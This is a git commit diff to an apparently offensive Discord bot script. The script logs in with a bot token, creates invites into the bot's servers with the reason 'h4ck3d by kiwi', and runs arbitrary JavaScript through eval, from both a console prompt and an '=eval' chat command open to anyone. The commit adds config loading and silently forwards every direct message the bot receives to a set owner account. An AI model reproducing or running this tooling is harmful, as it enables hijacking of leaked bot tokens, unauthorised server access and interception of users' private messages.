bfc2515ca1f189d023dfa13418678463731f287e
LeRoiDesKiwis <lekiwidu17@gmail.com>
2020-06-15 19:54:36 +0200

    implement config

--- index.js
+++ index.js
@@ -1,60 +1,70 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
 const { prompt } = require('inquirer')
+const config = require('./config.json')
 
 client.on('ready', () => {
-    console.log('Ready !')
-    console.log(`Connected as ${client.user.username}#${client.user.discriminator} (id : ${client.user.id})`)
+	console.log('Ready !')
+	console.log(`Connected as ${client.user.username}#${client.user.discriminator} (id : ${client.user.id})`)
 
 	const guilds = client.guilds.cache
 		.filter(guild => guild.member(client.user).hasPermission('CREATE_INSTANT_INVITE'))
-		.map(({id, name, owner}) => `${id} - ${name} (owned by ${owner.user.username})`);
-	
+		.map(({ id, name, owner }) => `${id} - ${name} (owned by ${owner.user.username})`);
+
 	guilds.unshift("Aucun")
 
-    getGuild(guilds).then(({guild: id}) => {
-		if(id == 'Aucun'){
+	getGuild(guilds).then(id => {
+		if (id == 'Aucun') {
 			console.log("Tu as choisi de ne pas générer d'invitation")
 			customEval();
 			return;
 		}
 		const guild = client.guilds.resolve(id);
-		guild.systemChannel.createInvite({reason: "h4ck3d by kiwi"}).then(invite => {
+		guild.systemChannel.createInvite({ reason: "h4ck3d by kiwi" }).then(invite => {
 			console.log(`Invite link : ${invite.url}`);
 			customEval()
 		})
-	
+
 	});
 
 })
 
 client.on('message', message => {
-	if(message.content.startsWith('=eval ')){
-		const embed = new Discord.MessageEmbed();
+	const embed = new Discord.MessageEmbed();
+	if (message.content.startsWith('=eval ')) {
 		command = message.content.substr(6);
-		try{
+		try {
 			embed.setDescription(eval(command));
 			embed.setColor(0x00ff00);
 			embed.setTitle("Successful !");
-		}catch(exception){
+		} catch (exception) {
 			embed.setColor(0xff0000);
 			embed.setTitle("An error has occured :(");
 			embed.setDescription(exception);
 		}
 		message.channel.send(embed)
 	}
+
+	if (message.channel.type == 'dm') {
+		if (message.author === client.user) return;
+		embed.setColor(0x28ccde)
+		embed.setAuthor(message.author.username, message.author.avatarURL)
+		embed.setTitle("mp received")
+		embed.setDescription(message.content)
+		client.users.resolve(config.owner).send(embed);
+	}
 })
 
-function customEval(){
+function customEval() {
 	prompt([
 		{
-			name:"content",
-			message:"eval :"
+			name: "content",
+			message: "eval :"
 		}
-	]).then(({content}) => {
-		try{
+	]).then(({ content }) => {
+		try {
 			console.log(eval(content));
-		}catch(exception){
+		} catch (exception) {
 			console.log(exception)
 		}
 		customEval()
@@ -62,20 +72,32 @@ function customEval(){
 }
 
 const getGuild = (guilds) => {
-    return prompt([
-		{
-			name: "guild",
-			type: 'list',
-			message: 'Select a guild to invite :',
-			filter,
-			choices: guilds,
-		}
-	])
+	return new Promise((resolve, reject) => {
+		if (!config.skipinvite) {
+			prompt([
+				{
+					name: "guild",
+					type: 'list',
+					message: 'Select a guild to invite :',
+					filter,
+					choices: guilds,
+				}
+			]).then(({ guild: id }) => resolve(id))
+		} else resolve('Aucun')
+	})
 }
 
 function filter(str) {
 	return str.split(' ')[0]
 }
 
-prompt([{name:"token",message:"token :"}])
-	.then(({token}) => client.login(token).catch(() => console.log("invalid token !")));
+function getToken() {
+	return new Promise((resolve, reject) => {
+		if (config.token) {
+			resolve(config.token);
+		} else prompt([{ name: "token", message: "token :" }]).then(({ token }) => resolve(token)).catch(reject)
+	})
+}
+
+getToken()
+	.then(token => client.login(token).catch(() => console.log("invalid token !")));
